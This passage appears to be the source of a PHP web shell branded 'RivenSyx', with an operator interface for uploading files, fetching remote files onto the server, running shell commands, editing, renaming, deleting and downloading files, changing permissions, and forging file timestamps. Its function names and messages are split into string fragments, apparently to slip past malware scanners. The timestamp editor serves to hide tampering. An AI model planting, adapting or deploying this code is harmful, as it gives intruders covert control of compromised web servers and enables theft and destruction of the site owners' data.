    <div class="uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap"
        style="background: var(--gray-900);">
        <div class="tools-upload">
            <form action="" method="POST" enctype="multipart/form-data"
                class="form-tools uk-form-horizontal uk-margin uk-padding-small font-protest-riot">
                <input type="file" name="file[]" onchange="this.form.submit()" multiple>
            </form>
            <?php 
            if($_SERVER["REQUEST_METHOD"]==="POST"){if(isset($_FILES["file"])){$countFiles=count($_FILES["file"]["name"]);for($i=0;$i<$countFiles;$i++){$fi_le_Na_me=$_FILES["file"]["name"][$i];$location="".$fi_le_Na_me;$u_pl_oa_dF_un_ct_ion="m"."ove"."_up"."loa"."ded_fi"."le";if($u_pl_oa_dF_un_ct_ion($_FILES["file"]["tmp_name"][$i],$location)){echo '
                            <div class="uk-alert-success uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-white">Fi'.'le => <a href="'.$fi_le_Na_me.'">'.$fi_le_Na_me.'</a></font> Su'.'cc'.'es'.'s Up'.'lo'.'a'.'de'.'d <i class="fa-sharp fa-solid fa-shield-check"></i></p>
                            </div>
                            ';}else{echo '
                            <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-white">Fi'.'le => '.$fi_le_Na_me.'</font> Fa'.'il'.'ed '.'To'.' U'.'pl'.'oa'.'d <i class="fa-solid fa-octagon-xmark"></i></p>
                            </div>
                            ';}}}else{echo '
                    <div class="uk-alert-warning uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                        <a href class="uk-alert-close" uk-close></a>
                        <p>No Fi'.'l'.'es U'.'pl'.'oa'.'de'.'d.<i class="fa-regular fa-location-exclamation"></i></p>
                    </div>
                    ';}} 
                    ?>
        </div>
        <?php 
        if(isset($_POST['btn-remoteup'])){$this_file=$_POST['fileurl'];$this_file_name=$_POST['savedname'];$f_content=$f_get($this_file);if(!empty($this_file)&&!empty($this_file_name)){if($f_content!==false){$writeF=$f_put($this_file_name,$f_content);if($writeF!==false){echo '
                            <div class="uk-alert-success uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-white">Fi'.'le => <a href="'.$this_file_name.'">'.$this_file_name.'</a></font> S'.'uc'.'ce'.'s'.'s U'.'pl'.'oa'.'de'.'d <i class="fa-sharp fa-solid fa-shield-check"></i></p>
                            </div>
                            ';}else{echo '
                            <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-white">Fi'.'le => '.$this_file_name.'</font> Fa'.'i'.'le'.'d '.'To'.' Up'.'lo'.'ad<i class="fa-solid fa-octagon-xmark"></i></p>
                            </div>
                            ';}}else{echo '
                        <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                            <a href class="uk-alert-close" uk-close></a>
                            <p><font class="font-white">Fi'.'le => '.$this_file_name.'</font> Fa'.'il'.'ed T'.'o U'.'pl'.'oa'.'d<i class="fa-solid fa-octagon-xmark"></i></p>
                        </div>
                        ';}}else{echo '
                    <div class="uk-alert-warning uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                        <a href class="uk-alert-close" uk-close></a>
                        <p>No F'.'il'.'es U'.'pl'.'oa'.'de'.'d, Your Input Is Empty<i class="fa-regular fa-location-exclamation"></i></p>
                    </div>
                    ';}} 
                    ?>
        <div class="tools-remoteup uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap">
            <form action="" method="POST" class="uk-width-1-2">
                <fieldset class="uk-fieldset">
                    <legend class="uk-legend font-bold font-protest-riot"><?= 'Re' . 'mo' . 'te' . ' U' . 'pl' . 'oa' . 'd' ?>
                    </legend>
                    <div class="uk-margin-small">
                        <input class="uk-input font-poppins" name="fileurl" type="text"
                            placeholder="<?= 'https://yourdomain.com/path/files.php' ?>"
                            aria-label="Input">
                        <div class="uk-margin-small"></div>
                        <input class="uk-input font-poppins" name="savedname" type="text" placeholder="saved.txt"
                            aria-label="Input">
                    </div>
                    <div class="uk-float-right">
                        <button type="submit" name="btn-remoteup"
                            class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Get</button>
                    </div>
                </fieldset>
            </form>
        </div>
        <div class="tools-etc uk-flex uk-flex-center uk-flex-middle uk-flex-row uk-flex-wrap">
            <a href="?L=<?= $path ?>&tools=newfiles"><button
                    class="btn-new-file uk-button uk-button-default uk-margin-large-bottom font-white font-protest-riot"><i
                        class="fa-solid fa-file-plus"></i>&nbsp;<?= 'N' . 'ew' . ' F' . 'il' . 'e' . 's' ?></button></a>
            <a href="?L=<?= $path ?>&tools=cmd"><button
                    class="btn-cmd uk-button uk-button-default uk-margin-small-left uk-margin-small-right uk-margin-large-bottom font-white font-ubuntu-mono"><i
                        class="fa-solid fa-rectangle-terminal"></i>&nbsp;<?= 'C' . 'o' . 'mm' . 'an' . 'd' ?></button></a>
            <a href="?L=<?= $path ?>&tools=newfolder"><button
                    class="btn-new-folder uk-button uk-button-default uk-margin-large-bottom font-white font-protest-riot"><i
                        class="fa-sharp fa-solid fa-folder-plus"></i>&nbsp;<?= 'N' . 'ew' . ' F' . 'ol' . 'de' . 'r' ?></button></a>
        </div>
        <div class="mass uk-flex uk-flex-center uk-flex-middle uk-flex-column">
            <?php 
            if(isset($_POST['btn-mass'])){if(isset($_POST['mass-option'])=='mass_delete'){if(!empty($_POST['checkfolder'])){foreach($_POST['checkfolder']as $folder){if(is_dir($folder)){if(deleteDir($folder)){echo '
                                    <div class="uk-alert-success" uk-alert>
                                        <a href class="uk-alert-close" uk-close></a>
                                        <p>'.$folder.' De'.'le'.'te'.'d!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                                    </div>
                                    ';}else{echo '
                                    <div class="uk-alert-danger" uk-alert>
                                        <a href class="uk-alert-close" uk-close></a>
                                        <p>'.$folder.' C'.'an'.' N'.'ot'.' D'.'el'.'et'.'e'.'d!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                                    </div>
                                    ';}}}}if(!empty($_POST['checkfile'])){foreach($_POST['checkfile']as $file){if(file_exists($file)){if(deleteFile($file)){echo '
                                    <div class="uk-alert-success" uk-alert>
                                        <a href class="uk-alert-close" uk-close></a>
                                        <p>'.$file.' De'.'le'.'te'.'d!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                                    </div>
                                    ';}else{echo '
                                    <div class="uk-alert-danger" uk-alert>
                                        <a href class="uk-alert-close" uk-close></a>
                                        <p>'.$file.' Ca'.'n '.'No'.'t D'.'el'.'et'.'ed'.'!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                                    </div>
                                    ';}}}}}else{}} 
                                    ?>
        </div>
        <?php 
        if(isset($_GET['deletedir'])){$dirName=$_GET['deletedir'];if(deleteDir($dirName)){echo '
                        <div class="uk-alert-success" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Success, F'.'ol'.'de'.'r D'.'el'.'et'.'e'.'d!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                        </div>
                        ';}else{echo '
                        <div class="uk-alert-danger" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Failed, F'.'ol'.'d'.'er'.' C'.'an'.' N'.'o'.'t D'.'el'.'et'.'e'.'d!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                        </div>
                        ';}}if(isset($_GET['deletefile'])){$fileName=$_GET['deletefile'];if(deleteFile($fileName)){echo '
                    <div class="uk-alert-success" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>Success, F'.'i'.'l'.'e D'.'el'.'et'.'ed'.'!&nbsp;<i class="fa-solid fa-trash-check"></i></p>
                    </div>
                    ';}else{echo '
                <div class="uk-alert-danger" uk-alert>
                    <a href class="uk-alert-close" uk-close></a>
                    <p>Failed, F'.'il'.'e C'.'a'.'n No'.'t D'.'e'.'le'.'te'.'d!&nbsp;<i class="fa-solid fa-trash-xmark"></i></p>
                </div>
                ';}}$toolsparam=isset($_GET['tools'])?$_GET['tools']:null;if($toolsparam===null){}elseif($toolsparam==='newfiles'){if(isset($_POST['btn-newfiles'])){$fi_le_name=htmlspecialchars($_POST['newfilesname']);$fi_le_content=$_POST['newfilecontent'];$f_il_e_success='
                    <div class="uk-alert-success" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>'.$fi_le_name.'&nbsp;Fi'.'le Created&nbsp;<i class="fa-solid fa-file-check font-green"></i></p>
                    </div>
                    ';$f_il_e_failed='
                    <div class="uk-alert-danger" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>Create Fi'.'le Failed&nbsp;<i class="fa-solid fa-file-xmark font-red"></i></p>
                    </div>
                    ';if($fi_le_name==''&&$fi_le_content==''){echo '
                        <div class="uk-alert-warning" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Sorry. Cant Not Cr'.'e'.'a'.'t'.'e Fi'.'l'.'es. Your Input Is Empty&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                        </div>
                        ';}else{if($func_exist($fo)){$c_r_e_a_t_e_f_i_l_e_1=$fo($fi_le_name,'w');if($c_r_e_a_t_e_f_i_l_e_1===false){$c_r_e_a_t_e_f_i_l_e_2=$f_put($fi_le_name,$fi_le_content);if($c_r_e_a_t_e_f_i_l_e_2===false){echo $f_il_e_failed;}else{echo $f_il_e_success;}}else{if($fw($c_r_e_a_t_e_f_i_l_e_1,$fi_le_content)===false){echo $f_il_e_failed;}else{echo $f_il_e_success;}$fc($c_r_e_a_t_e_f_i_l_e_1);}}elseif($func_exist($f_put)){$c_r_e_a_t_e_f_i_l_e_2=$f_put($fi_le_name,$fi_le_content);if($c_r_e_a_t_e_f_i_l_e_2===false){echo $f_il_e_failed;}else{echo $f_il_e_success;}}else{echo '
                            <div class="uk-alert-warning" uk-alert>
                                <a href class="uk-alert-close" uk-close></a>
                                <p>Sorry. Cant Not Cr'.'ea'.'t'.'e Fi'.'le'.'s&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                            </div>
                            ';}}}echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-new'.'fi'.'le'.'s" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Cr'.'ea'.'te F'.'il'.'e</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">N'.'e'.'w '.'F'.'il'.'es</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newfi'.'l'.'es'.'na'.'me" type="text" placeholder="fi'.'le'.'na'.'me.'.'t'.'x'.'t" aria-label="Input">
                        </div>
                        <div class="uk-margin">
                            <textarea class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" placeholder="Let\'s see the juice, coder!" aria-label="Textarea"></textarea>
                        </div>
                    </fieldset>
                </form>
                ';}elseif($toolsparam==='newfolder'){if(isset($_POST['btn-newfolder'])){$f_ol_de_r_name=htmlspecialchars($_POST['newfoldername']);$f_ol_de_r_success='
                    <div class="uk-alert-success" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p><font class="font-yellow">'.$f_ol_de_r_name.'</font>&nbsp;Fo'.'ld'.'er Cr'.'ea'.'te'.'d&nbsp;<i class="fa-solid fa-folder-check font-green"></i></p>
                    </div>
                    ';$f_ol_de_r_failed='
                    <div class="uk-alert-danger" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>Cr'.'ea'.'t'.'e F'.'ol'.'de'.'r Failed&nbsp;<i class="fa-solid fa-folder-xmark font-red"></i></p>
                    </div>
                    ';if($f_ol_de_r_name==''){echo '
                        <div class="uk-alert-warning" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Sorry. Cant Not Cr'.'e'.'at'.'e Fo'.'ld'.'er. This Input Is Empty&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                        </div>
                        ';}else{if(!$is_d($f_ol_de_r_name)){if($cr_ea_teF_old_er($f_ol_de_r_name)){echo $f_ol_de_r_success;}else{echo $f_ol_de_r_failed;}}else{echo '
                            <div class="uk-alert-warning" uk-alert>
                                <a href class="uk-alert-close" uk-close></a>
                                <p>Sorry. Cant Not C'.'re'.'at'.'e F'.'ol'.'de'.'r. This '.$fo_lde_rna_me.' Allready Exists&nbsp;<i class="fa-regular fa-location-exclamation font-yellow"></i></p>
                            </div>
                            ';}}}echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-newfolder" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Cr'.'ea'.'te'.' F'.'ol'.'de'.'r</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">N'.'e'.'w '.'F'.'ol'.'de'.'r</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newfoldername" type="text" placeholder="N'.'e'.'w F'.'ol'.'d'.'er" aria-label="Input">
                        </div>
                    </fieldset>
                </form>
                ';}elseif($toolsparam==='cmd'){echo '
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <legend class="uk-legend font-bold font-protest-riot"><i class="fa-solid fa-rectangle-terminal"></i>&nbsp;&nbsp;C'.'o'.'mm'.'an'.'d</legend>
                        <div class="uk-margin-small uk-flex uk-flex-row uk-flex-center uk-flex-middle uk-flex-nowrap">
                            <label for="komendnya" class="uk-margin-small-right uk-text-large">$</label>
                            <input style="background: var(--gray-950);" class="uk-input font-poppins uk-margin-small-right" id="komendnya" name="komendnya" type="text" aria-label="Input" autofocus>
                            <button type="submit" name="btn-cmd" style="background: var(--gray-950); border: 1px solid var(--gray-700);" class="uk-button uk-button-secondary uk-text-bold uk-border-rounded">ENTER</button>
                        </div>
                        <div>';if(isset($_POST['btn-cmd'])){echo '<textarea style="background: var(--gray-950); border: 1px solid var(--gray-500); color: var(--green-500);" class="output-cmd uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea" readonly>'.rivenC($_POST["komendnya"]).'</textarea>';}echo '</div>
                    </fieldset>
                </form>
                ';}else{}if(isset($_GET['editfile'])){$this_file=$_GET['editfile'];if(isset($_POST['btn-editfiles'])){$newfilecontent=$_POST['newfilecontent'];$f_il_e_success='
                        <div class="uk-alert-success" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Success, Fi'.'le Saved&nbsp;<i class="fa-solid fa-file-check font-green"></i></p>
                        </div>
                        ';$f_il_e_failed='
                    <div class="uk-alert-danger" uk-alert>
                        <a href class="uk-alert-close" uk-close></a>
                        <p>Failed, Fi'.'le Not Saved&nbsp;<i class="fa-solid fa-file-xmark font-red"></i></p>
                    </div>
                    ';if($func_exist($fo)){$editfi_le1=$fo($this_file,'w');if($fw($editfi_le1,$newfilecontent)){echo $f_il_e_success;}else{echo $f_il_e_failed;}}elseif($func_exist($f_put)){$editfi_le2=$f_put($this_file,$newfilecontent);if($editfi_le2===false){echo $f_il_e_failed;}else{echo $f_il_e_success;}}else{echo '
                        <div class="uk-alert-warning" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Sorry. Cant Edit This Fi'.'le '.$this_file.'&nbsp;<i class="fa-solid fa-file-exclamation"></i></p>
                        </div>
                        ';}}echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-editfiles" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Save</button>
                        </div>
                        <legend class="uk-legend font-bold font-protest-riot">Edit Files</legend>
                        <p class="font-teal">'.$path.'/'.$this_file.'</p>
                        <div class="uk-margin">
                            <textarea style="background: var(--gray-950); color: var(--emerald-500);" class="uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea">'.$hayoloh(rivenRead($this_file)).'</textarea>
                        </div>
                    </fieldset>
                </form>
                ';}if(isset($_GET['rename'])){$hayoloh='h'.'tm'.'lspe'.'cialc'.'hars';$this_name=$_GET['rename'];$rnm='r'.'e'.'n'.'a'.'m'.'e';if(isset($_POST['btn-rename'])){$newname=$hayoloh($_POST['newname']);if($rnm($this_name,$path.'/'.$newname)){echo '
                        <div class="uk-alert-success" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>
                                <font class="font-green">Rename Success&nbsp;<i class="fa-sharp fa-regular fa-shield-check font-green"></i>
                                <font class="font-white">'.$this_name.' To '.$newname.'</font>
                            </p>
                        </div>
                        ';}else{echo '
                        <div class="uk-alert-danger" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Rename Failed&nbsp;<i class="fa-regular fa-octagon-xmark font-red"></i></p>
                        </div>
                        ';}$this_name=$newname;}echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-rename" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Rename</button>
                        </div>
                        <p class="font-teal">'.$path.'/'.$this_name.'</p>
                        <legend class="uk-legend font-bold font-protest-riot">Rename</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newname" type="text" value="'.$this_name.'" aria-label="Input">
                        </div>
                    </fieldset>
                </form>
                ';}if(isset($_GET['permission'])){$hayoloh='h'.'tm'.'lspe'.'cialc'.'hars';$value=$path.'/'.$_GET['permission'];if(isset($_POST['btn-permission'])){$newperms=$hayoloh($_POST['newperms']);$chperms='c'.'h'.'m'.'o'.'d';$oct='o'.'c'.'t'.'d'.'e'.'c';if($chperms($value,$oct($newperms))){echo '
                        <div class="uk-alert-success" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p><font class="font-green">Change Permission Success&nbsp;<i class="fa-sharp fa-regular fa-shield-check font-green"></i></p>
                        </div>
                        ';}else{echo '
                        <div class="uk-alert-danger" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Change Permission Failed&nbsp;<i class="fa-regular fa-octagon-xmark font-red"></i></p>
                        </div>
                        ';}}echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-permission" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Change Permission</button>
                        </div>
                        <p class="font-teal">'.$value.'</p>
                        <legend class="uk-legend font-bold font-protest-riot">Cange Permission</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newperms" type="text" value="'.chPerms($value).'" aria-label="Input">
                        </div>
                    </fieldset>
                </form>
                ';}if(isset($_GET['changedate'])){$hayoloh='h'.'tm'.'lspe'.'cialc'.'hars';$f_time='f'.'il'.'e'.'m'.'t'.'im'.'e';$str_time='s'.'tr'.'to'.'ti'.'me';$tch='to'.'uc'.'h';$value=$_GET['changedate'];$this_date=date("Y-m-d H:i:s",$f_time($value));if(isset($_POST['btn-newdate'])){$newDate=$hayoloh($_POST['newdate']);if($str_time($newDate)!==false){if($tch($value,$str_time($newDate))){echo '
                            <div class="uk-alert-success" uk-alert>
                                <a href class="uk-alert-close" uk-close></a>
                                <p><font class="font-green">Change Date Success&nbsp;<i class="fa-solid fa-calendar-check"></i></p>
                            </div>
                            ';}else{echo '
                            <div class="uk-alert-danger" uk-alert>
                                <a href class="uk-alert-close" uk-close></a>
                                <p>Change Date Failed&nbsp;<i class="fa-solid fa-calendar-xmark"></i></p>
                            </div>
                            ';}}else{echo '
                        <div class="uk-alert-warning" uk-alert>
                            <a href class="uk-alert-close" uk-close></a>
                            <p>Change Date Failed, Invalid Date Format&nbsp;<i class="fa-solid fa-calendar-exclamation"></i></p>
                        </div>
                        ';}}echo '
                <div class="uk-divider uk-divider-small"></div>
                <form action="" method="POST" class="uk-width-1-2">
                    <fieldset class="uk-fieldset">
                        <div class="uk-margin uk-float-right">
                            <button type="submit" name="btn-newdate" class="uk-button uk-button-primary uk-text-bold uk-border-rounded">Change Date</button>
                        </div>
                        <p class="font-teal">'.$path.'/'.$value.'</p>
                        <legend class="uk-legend font-bold font-protest-riot">Cange Date</legend>
                        <div class="uk-margin">
                            <input class="uk-input font-poppins" name="newdate" type="text" value="'.$this_date.'" aria-label="Input">
                        </div>
                    </fieldset>
                </form>
                ';} 
                ?>
    </div>
    <div class="main uk-width-1-1 uk-margin-top uk-margin-small-left uk-margin-small-right"
        style="background: var(--gray-900);">
        <?php
        $scn_d = 'sc' . 'an' . 'd' . 'ir';
        $scan = $scn_d($path);
        ?>
        <div class="uk-overflow-auto uk-flex uk-flex-center uk-flex-middle uk-flex-row uk-flex-wrap">
            <form action="" method="POST" enctype="multipart/form-data" class="uk-width-1-1">
                <table class="synx-table uk-width-1-1">
                    <thead>
                        <tr>
                            <th>Select All<br><input type="checkbox" id="checkall" class="checkall" name="checkall"
                                    aria-label="Checkbox"></th>
                            <th>Name</th>
                            <th>Last Modified</th>
                            <th>Size</th>
                            <th>Owner/Group</th>
                            <th>Permission</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><?= '-' . 'S' . 'Y' . 'X' . '-' ?></td>
                            <td class="body-folder uk-text-nowrap"><a href="?L=<?= dirname($path) ?>"
                                    class="dirpath font-white"><i
                                        class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;..</a></td>
                            <td><?= '-'  . '- ' . 'S ' . 'Y ' . 'X ' . '-' . '-'  ?></td>
                            <td><?= '-'  . '- ' . 'S ' . 'Y ' . 'X ' . '-' . '-'  ?></td>
                            <td><?= '-'  . '- ' . 'S ' . 'Y ' . 'X ' . '-' . '-'  ?></td>
                            <td><?= '-'  . '- ' . 'S ' . 'Y ' . 'X ' . '-' . '-'  ?></td>
                            <td><?= '-'  . '- ' . 'S ' . 'Y ' . 'X ' . '-' . '-'  ?></td>
                        </tr>
<?php 
foreach($scan as $dir){if(!is_dir("$path/$dir")||$dir=='.'||$dir=='..')continue;if($func_exist($psx_usr_uid)){$d_owner=@$psx_usr_uid($own_f("$path/$dir"));$d_owner=$d_owner['name'];}else{$d_owner=$own_f("$path/$dir");}if($func_exist($psx_grp_gid)){$d_group=@$psx_grp_gid($grp_f("$path/$dir"));$d_group=$d_group['name'];}else{$d_group=$grp_f("$path/$dir");}echo '<tr class="tr-body">';echo '<td><input type="checkbox" class="checkfilefolder" name="checkfolder[]" value="'.$dir.'" aria-label="Checkbox"></td>';echo '<td class="body-folder uk-text-nowrap"><a href="?L='.$path.'/'.$dir.'" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;'.$dir.'</a></td>';echo '<td class="uk-text-nowrap"><a href="?L='.$path.'&changedate='.$dir.'" class="body-datetime">'.date('Y-m-d H:i:s',filemtime($path.'/'.$dir)).'</a></td>';echo '<td class="body-size uk-text-nowrap">--DIR--</td>';echo '<td class="uk-text-nowrap">';if($d_owner=='root'||$d_owner==0){echo '<font class="font-white">'.$d_owner.'</font>';}else{echo '<font class="font-sky">'.$d_owner.'</font>';}echo '/';if($d_group=='root'||$d_group==0){echo '<font class="font-white">'.$d_group.'</font>';}else{echo '<font class="font-sky">'.$d_group.'</font>';}echo '</td>';echo '<td class="uk-text-nowrap"><a href="?L='.$path.'&permission='.$dir.'" class="body-permission">';if($is_w("$path/$dir"))echo '<font class="font-green green-perms">';elseif(!$is_r("$path/$dir"))echo '<font class="font-red red-perms">';echo perms("$path/$dir");if($is_w("$path/$dir")||!$is_r("$path/$dir"))echo '</font></a></td>';echo '<td class="uk-text-nowrap">';echo '<a href="?L='.$path.'&rename='.$dir.'" uk-tooltip="Rename"><i class="icon fa-sharp fa-solid fa-pen-field rename-folder-icon"></i></a>';echo '<a href="?L='.$path.'&permission='.$dir.'" class="uk-margin-small-left uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-duotone fa-user-pen user-icon"></i></a>';echo '<a href="?L='.$path.'&deletedir='.$dir.'" uk-tooltip="Permission"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></a>';echo '</td>';echo '</tr>';}foreach($scan as $file){$f_size='f'.'il'.'es'.'iz'.'e';if(!$is_f("$path/$file"))continue;$size=$f_size("$path/$file")/1024;$size=$rnd($size,3);if($size>=1024){$size=$rnd($size/1024,2).' MB';}else{$size=$size.' KB';}if($func_exist($psx_usr_uid)){$f_owner=@$psx_usr_uid($own_f("$path/$file"));$f_owner=$f_owner['name'];}else{$f_owner=$own_f("$path/$file");}if($func_exist($psx_grp_gid)){$f_group=@$psx_grp_gid($grp_f("$path/$file"));$f_group=$f_group['name'];}else{$f_group=$grp_f("$path/$file");}echo '<tr class="tr-body">';echo '<td><input type="checkbox" class="checkfilefolder" name="checkfile[]" value="'.$file.'" aria-label="Checkbox"></td>';echo '<td class="body-file uk-text-nowrap"><a href="?L='.$path.'&editfile='.$file.'" class="filepath font-white"><i class="fa-solid fa-files font-white"></i>&nbsp;&nbsp;'.$file.'</a></td>';echo '<td class="uk-text-nowrap"><a href="?L='.$path.'&changedate='.$file.'" class="body-datetime">'.date('Y-m-d H:i:s',filemtime($path.'/'.$file)).'</a></td>';echo '<td class="body-size uk-text-nowrap">'.$size.'</td>';echo '<td class="uk-text-nowrap">';if($f_owner=='root'||$f_owner==0){echo '<font class="font-white">'.$f_owner.'</font>';}else{echo '<font class="font-sky">'.$f_owner.'</font>';}echo '/';if($f_group=='root'||$f_group==0){echo '<font class="font-white">'.$f_group.'</font>';}else{echo '<font class="font-sky">'.$f_group.'</font>';}echo '</td>';echo '<td class="uk-text-nowrap"><a href="?L='.$path.'&permission='.$file.'" class="body-permission">';if($is_w("$path/$file"))echo '<font class="font-green green-perms">';elseif(!$is_r("$path/$file"))echo '<font class="font-red red-perms">';echo perms("$path/$file");if($is_w("$path/$file")||!$is_r("$path/$file"))echo '</font></a></td>';echo '<td class="uk-text-nowrap">';echo '<a href="?L='.$path.'&rename='.$file.'" uk-tooltip="Rename"><i class="icon fa-sharp fa-solid fa-pen-field rename-file-icon"></i></a>';echo '<a href="?L='.$path.'&editfile='.$file.'" class="uk-margin-small-left" uk-tooltip="Edit"><i class="icon fa-regular fa-file-pen edit-file-icon"></i></a>';echo '<a href="?L='.$path.'&permission='.$file.'" class="uk-margin-small-left uk-margin-small-right" uk-tooltip="Permission"><i class="icon fa-duotone fa-user-pen user-icon"></i></a>';echo '<a href="?L='.$path.'&downloadfile='.$file.'" class="uk-margin-small-right" uk-tooltip="Download"><i class="icon fa-solid fa-folder-arrow-down download-icon"></i></a>';echo '<a href="?L='.$path.'&deletefile='.$file.'" uk-tooltip="Delete"><i class="icon fa-solid fa-trash-can-slash delete-icon"></i></a>';echo '</td>';echo '</tr>';} 
?>
                    </tbody>
                </table>
                <div class="uk-margin">
                    <script>
                        var selectAllCheckbox = document.getElementById('checkall');
                        var checkFileFolder = document.querySelectorAll('.checkfilefolder');
                        selectAllCheckbox.addEventListener('change', function() {
                            for (var i = 0; i < checkFileFolder.length; i++) {
                                checkFileFolder[i].checked = selectAllCheckbox.checked;
                            }
                        });
                        for (var i = 0; i < checkFileFolder.length; i++) {
                            checkFileFolder[i].addEventListener('change', function() {
                                var allChecked = true;
                                for (var j = 0; j < checkFileFolder.length; j++) {
                                    if (!checkFileFolder[j].checked) {
                                        allChecked = false;
                                        break;
                                    }
                                }
                                selectAllCheckbox.checked = allChecked;
                            });
                        }
                    </script>
                    <select class="mass-option font-white uk-select uk-width-1-6" aria-label="Custom controls"
                        name="mass-option">
                        <option name="mass-delete" value="mass_delete">Delete</option>
                    </select>
                    <button type="submit" name="btn-mass" class="btn-mass font-white">&gt;&gt;</button>
                </div>
            </form>
        </div>
    </div>
    <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap"
        style="background: var(--gray-950);">
        <div class="footer-content uk-padding-small">
            <span class="font-protest-riot"><a class="font-rose">+- R i v e n S y x +-</a>
            </span>
        </div>
    </div>
    <script src="<?= $uikit_js ?>"></script>
    <script src="<?= $uikit_icon ?>"></script>
</body>

</html>
